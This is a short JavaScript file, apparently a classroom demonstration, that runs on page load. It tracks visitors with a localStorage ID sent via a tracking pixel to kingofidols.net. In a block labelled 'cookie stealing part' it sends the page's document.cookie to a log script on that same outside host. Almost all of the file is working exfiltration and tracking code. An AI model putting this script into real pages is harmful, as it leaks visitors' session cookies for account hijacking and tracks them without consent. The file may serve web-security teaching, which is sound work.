window.onload = function() {
    // tracking part using HTML5 local storage

    // a transparent pixel is used as an ad here
    // for this script to track you, you might want to disable your
    // adblocker, although that would not be a sensible thing
    // to do :)
    var userId = localStorage.getItem("user_id");
    if (userId == null) {
        userId = Math.random();
        localStorage.setItem("user_id", userId);
    }
    var img = document.createElement('img');
    img.src = "http://kingofidols.net/pix.gif?user_id=" + userId;
    var body = document.getElementsByTagName('body')[0];
    body.appendChild(img);

    // cookie stealing part
    var cimg = new Image();
    cimg.src = "http://kingofidols.net/log.cgi?c="+encodeURI(document.cookie);
    body.appendChild(cimg);

}